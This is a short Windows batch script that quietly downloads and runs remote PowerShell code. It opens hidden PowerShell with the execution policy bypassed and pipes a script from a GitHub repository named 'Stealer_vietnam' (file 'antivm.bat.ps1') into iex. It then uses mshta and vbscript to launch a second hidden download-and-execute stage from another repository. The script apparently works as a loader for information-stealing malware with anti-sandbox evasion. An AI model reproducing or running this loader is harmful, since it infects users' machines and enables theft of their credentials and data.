@echo off
powershell -Win Hidden -NoP -Command "Set-ExecutionPolicy Bypass -Scope Process; iex (iwr -UseBasicP -Uri 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.bat.ps1')"
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t -replace 'skid', 'skid' | iex",0))
